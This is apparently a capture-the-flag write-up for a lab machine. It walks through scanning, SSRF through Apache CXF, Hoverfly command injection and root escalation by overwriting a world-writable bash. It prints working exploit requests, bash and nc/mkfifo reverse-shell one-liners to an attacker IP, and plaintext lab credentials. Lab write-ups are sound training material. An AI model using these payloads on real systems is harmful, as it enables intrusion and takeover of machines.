```bash

Preview all results? (Y/n) y

== ferox_http_8080.txt ==

== ferox_http_80.txt ==
200      GET       12l       53w      461c http://devarea.htb/assets/images/company-logo3.svg
200      GET       12l       54w      478c http://devarea.htb/assets/images/company-logo2.svg
200      GET       14l       86w      825c http://devarea.htb/assets/images/post-icon.svg
200      GET       15l       65w      575c http://devarea.htb/assets/images/company-logo1.svg
200      GET       16l      113w     8136c http://devarea.htb/assets/images/john-dev.jpg
200      GET       19l       91w      814c http://devarea.htb/assets/images/company-logo4.svg
200      GET       21l      111w     8480c http://devarea.htb/assets/images/david-dev.jpg
200      GET       21l      132w    12288c http://devarea.htb/assets/images/ryan-dev.jpg
200      GET       29l      150w    11675c http://devarea.htb/assets/images/sarah-dev.jpg
200      GET      475l     1097w    22211c http://devarea.htb/
200      GET      475l     1097w    22211c http://devarea.htb/index
200      GET      475l     1097w    22211c http://devarea.htb/index.html
200      GET       48l      263w     2478c http://devarea.htb/assets/images/hero-image.svg
200      GET        6l       35w      299c http://devarea.htb/assets/images/testimonial-1.svg
200      GET        6l       35w      299c http://devarea.htb/assets/images/testimonial-2.svg
200      GET      709l     1246w    11282c http://devarea.htb/assets/css/style.css
200      GET        7l       78w      498c http://devarea.htb/assets/images/match-icon.svg
200      GET        9l       59w      482c http://devarea.htb/assets/images/hire-icon.svg
301      GET        9l       28w      311c http://devarea.htb/assets => http://devarea.htb/assets/

== ferox_http_8500.txt ==

== ferox_http_8888.txt ==
200      GET       14l       32w      600c http://devarea.htb:8888/
200      GET       14l       32w      600c http://devarea.htb:8888/dashboard
200      GET       14l       32w      600c http://devarea.htb:8888/login
200      GET        1l     1370w    68001c http://devarea.htb:8888/polyfills.09835b67f4e254a9e063.js
200      GET        1l    13817w   633940c http://devarea.htb:8888/main.8c9b7348638cc8a40f85.js
200      GET        1l       34w     1440c http://devarea.htb:8888/runtime.06daa30a2963fa413676.js
200      GET        1l       38w    18231c http://devarea.htb:8888/favicon.ico
200      GET        1l        6w      895c http://devarea.htb:8888/styles.6f6b999bedb20ff0d327.css

== nmap_results.txt ==
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-18 08:45 -0400
Nmap scan report for devarea.htb (10.129.244.208)
Host is up (0.069s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.194
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: DevArea - Connect with Top Development Talent
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 18 Apr 2026 12:46:06 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 18 Apr 2026 12:45:50 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.98%I=7%D=4/18%Time=69E37CFE%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20
SF:Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nDate:\x20Sat,\x2018\x20Apr\x202026\x2012:45:50
SF:\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20ser
SF:ver\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(
SF:HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nDate:\x20Sat,\x2018\x20Apr\x202026\x2012:45:50\x20GMT\r\nCo
SF:ntent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20Does
SF:\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPRequest,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20In
SF:ternal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2018\x20Apr
SF:\x202026\x2012:46:06\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\
SF:x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\
SF:x20requests\.\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.27 seconds

== subDomains.txt ==

============================================
  RECON SUMMARY
  Target:    10.129.244.208
  DNS:       devarea.htb
  Generated: 2026-04-18 08:53:41
============================================

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------

  [ http://devarea.htb ]
    200   /
    200   /assets/css/style.css
    200   /assets/images/company-logo1.svg
    200   /assets/images/company-logo2.svg
    200   /assets/images/company-logo3.svg
    200   /assets/images/company-logo4.svg
    200   /assets/images/david-dev.jpg
    200   /assets/images/hero-image.svg
    200   /assets/images/hire-icon.svg
    200   /assets/images/john-dev.jpg
    200   /assets/images/match-icon.svg
    200   /assets/images/post-icon.svg
    200   /assets/images/ryan-dev.jpg
    200   /assets/images/sarah-dev.jpg
    200   /assets/images/testimonial-1.svg
    200   /assets/images/testimonial-2.svg
    200   /index
    200   /index.html
    301   /assets/

  [ http://devarea.htb:8888 ]
    200   /
    200   /dashboard
    200   /favicon.ico
    200   /login
    200   /main.8c9b7348638cc8a40f85.js
    200   /polyfills.09835b67f4e254a9e063.js
    200   /runtime.06daa30a2963fa413676.js
    200   /styles.6f6b999bedb20ff0d327.css

--------------------------------------------
  SUBDOMAINS  (0 found)
--------------------------------------------
  none

--------------------------------------------
  OPEN PORTS & SERVICES
--------------------------------------------
  21/tcp     ftp            vsftpd 3.0.5
  22/tcp     ssh            OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
  80/tcp     http           Apache httpd 2.4.58
  8080/tcp   http           Jetty 9.4.27.v20200227
  8500/tcp   http           Golang net/http server
  8888/tcp   http           Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

--------------------------------------------
  WEB PORTS
--------------------------------------------
  HTTP:   80 8080 8500 8888
  HTTPS:  none

============================================

=== Done! Results: /home/kali/github/ctf_tool/results/devarea.htb/ ===
```

Ok so we got loads of things here. ftp, ssh and a bunch of sites. Let's check the ftp first.

Ok so there is a file let's download it

```bash
ftp> ls
229 Entering Extended Passive Mode (|||43761|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
ftp> get employee-service.jar
```

Let's check what it has inside.
There is alot. Let's decompile it with jadx

```bash
jadx -d /tmp/out /home/kali/Downloads/employee.jar
```

```bash
cat ServerStarter.java 
package htb.devarea;

import org.apache.cxf.jaxws.JaxWsServerFactoryBean;

/* JADX INFO: loaded from: ServerStarter.class */
public class ServerStarter {
    public static void main(String[] args) {
        JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
        factory.setServiceClass(EmployeeService.class);
        factory.setServiceBean(new EmployeeServiceImpl());
        factory.setAddress("http://0.0.0.0:8080/employeeservice");
        factory.create();
        System.out.println("Employee Service running at http://localhost:8080/employeeservice");
        System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
    }
}
```

Ok important findings so far.

version: Jetty 9.4.27.v20200227
endpoint: employeeservice
apache cxf

https://www.penligent.ai/hackinglabs/cve-2022-46364-proof-of-concept-apache-cxf-mtom-ssrf-in-practice/

```bash
Current Description

A SSRF vulnerability in parsing the href attribute of XOP:Include in MTOM requests in versions of Apache CXF before 3.5.5 and 3.4.10 allows an attacker to perform SSRF style attacks on webservices that take at least one parameter of any type. 
```

We found an exploit let's run it

```bash
python3 CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/passwd -d devarea.htb
```
And as a result we got the /etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
_laurel:x:999:987::/var/log/laurel:/bin/false
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

So we were basically able to use ssrf to trick the site to fetch the /etc/passwd

Now let's enumerate for important stuff. We were able to go to the home folder, but there was no .ssh key and we weren't able to read the user.txt

```bash
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

I found these credentials from file:///etc/systemd/system/hoverfly.service

Now let's log in to http://devarea.htb:8888/login

admin:O7IJ27MyyXiU

The version is 	v1.11.3

https://nvd.nist.gov/vuln/detail/CVE-2025-54123

Apparently the in versions 1.11.3 and prior are vulnerable to command injection.

```bash
Hoverfly is an open source API simulation tool. In versions 1.11.3 and prior, the middleware functionality in Hoverfly is vulnerable to command injection vulnerability at `/api/v2/hoverfly/middleware` endpoint due to insufficient validation and sanitization in user input.
```

Im fairly sure ive used this exploit before in a previous exploit. This should be pretty straight forward.

https://github.com/advisories/GHSA-r4h8-hfp2-ggmf

Let's boot up burpsuite

```bash
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODc1NzQ0NDUsImlhdCI6MTc3NjUzNDQ0NSwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.0GM00GowRwEdSrYd7edIlHtnvd21EsRFdqJID4tDZNUQz3E2NShyWNw2MLZbiO4P9iCm94EvCgUpo4FWKhf6cA
Connection: keep-alive
Referer: http://devarea.htb:8888/dashboard
Content-Length: 56

{
    "binary": "/bin/bash",
    "script": "id"
}
```
This is out request.

```bash
HTTP/1.1 422 Unprocessable Entity
Date: Sat, 18 Apr 2026 18:17:05 GMT
Content-Length: 541
Content-Type: text/plain; charset=utf-8

{"error":"Failed to unmarshal JSON from middleware\nCommand: /bin/bash /tmp/hoverfly/hoverfly_1209310878\ninvalid character 'u' looking for beginning of value\n\nSTDIN:\n{\"response\":{\"status\":200,\"body\":\"ok\",\"encodedBody\":false,\"headers\":{\"test_header\":[\"true\"]}},\"request\":{\"path\":\"/\",\"method\":\"GET\",\"destination\":\"www.test.com\",\"scheme\":\"\",\"query\":\"\",\"formData\":null,\"body\":\"\",\"headers\":{\"test_header\":[\"true\"]}}}\n\nSTDOUT:\nuid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)\n"}```
```

There we can see that it worked and we got the results for id
Let's get a reverse shell.


```bash

{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.14.194/6666 0>&1"
}

listening on [any] 6666 ...
connect to [10.10.14.194] from (UNKNOWN) [10.129.244.208] 58388
bash: cannot set terminal process group (1437): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$ 
```
Ok now we are in. That was pretty straight forward.

Thereis a syswatch-v1.zip in the home folder lets unzip it and check it out.

```bash
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh
        web-stop, !/opt/syswatch/syswatch.sh web-restart
```

Ok so we are able to run a few commands as root, but i didn't find anything of interest

I decided to import linpeas over to automate the scan.

```bash
python3 -m http.server
```

```bash
wget http://10.10.14.194:8000/linpeas.sh
chmod +x linpeas.sh
```

well..

```bash
╔══════════╣ Writable root-owned executables I can modify (max 200) (T1574.009,T1574.010)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                     
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /usr/bin/bash     
```
Ok lets see if this file is being read or executed in any privileged process..

```bash
dev_ryan@devarea:/usr/bin$ grep -rl "/usr/bin/bash" /etc /usr /opt 2>/dev/null
<grep -rl "/usr/bin/bash" /etc /usr /opt 2>/dev/null
/etc/shells
/usr/share/vim/vim91/autoload/dist/script.vim
/usr/share/doc/bpfcc-tools/examples/doc/trace_example.txt
/usr/bin/nix
/usr/lib/x86_64-linux-gnu/libauparse.so.0.0.0
/usr/lib/x86_64-linux-gnu/libnss_systemd.so.2
/usr/lib/x86_64-linux-gnu/systemd/libsystemd-shared-255.so
/usr/lib/systemd/system/debug-shell.service
/usr/lib/file/magic.mgc
```

Ok normally we could modify the file, but since we are in a bash shell we aren't able to. We need to figure out a way to get another type of shell. Let's try "sh"

```bash
echo '#!/bin/sh
cat /root/root.txt > /tmp/flag' > /tmp/payload
chmod +x /tmp/payload
```

then we have to kill all the processes using bash

```bash
$ ps aux | grep bash | grep -v grep
dev_ryan   16460  0.0  0.0   7340  3612 ?        S    18:18   0:00 /bin/bash /tmp/hoverfly/hoverfly_967945221
dev_ryan   16461  0.0  0.1   8676  5572 ?        S    18:18   0:00 bash -i
dev_ryan   21182  0.0  0.0   7340  3572 ?        S    19:58   0:00 /bin/bash /tmp/hoverfly/hoverfly_2390967058
dev_ryan   21183  0.0  0.1   8808  5688 ?        S    19:58   0:00 bash -i
dev_ryan   69148  0.0  0.0   7340  3624 ?        S    20:36   0:00 /usr/bin/bash
dev_ryan   69345  0.0  0.0   5704  2228 ?        S    20:36   0:00 script /dev/null -c bash
dev_ryan   69346  0.0  0.1   8528  5460 pts/0    Ss   20:36   0:00 bash
dev_ryan   70969  0.0  0.0   7340  3716 ?        S    21:12   0:00 /bin/bash /tmp/hoverfly/hoverfly_1265167613
$ kill -9 16460 16461 21182 21183 69148 69345 69346 70969
$ px aux | grep bash | grep -v grep
sh: 22: px: not found
```

After we killed all the bash processes we were able to change the /usr/bin/bash

```bash
$ cp /tmp/payload /usr/bin/bash
```

```bash
$ cat /usr/bin/bash
#!/bin/sh
cat /root/root.txt > /tmp/flag
```

Then if we just run the previous sudo command we are able to get the flag

```bash
$ sudo -l
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh
        web-stop, !/opt/syswatch/syswatch.sh web-restart
$ sudo /opt/syswatch/syswatch.sh
$ cat /tmp/flag
b37cfb72d5aa951#####d45c313f7ca
```

I also tried a different approach and just get the root shell
```bash
$ cat /usr/bin/bash
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.194 6666 >/tmp/f
$ sudo /opt/syswatch/syswatch.sh
```

It worked nice.

```bash
─$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.194] from (UNKNOWN) [10.129.244.208] 35016
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
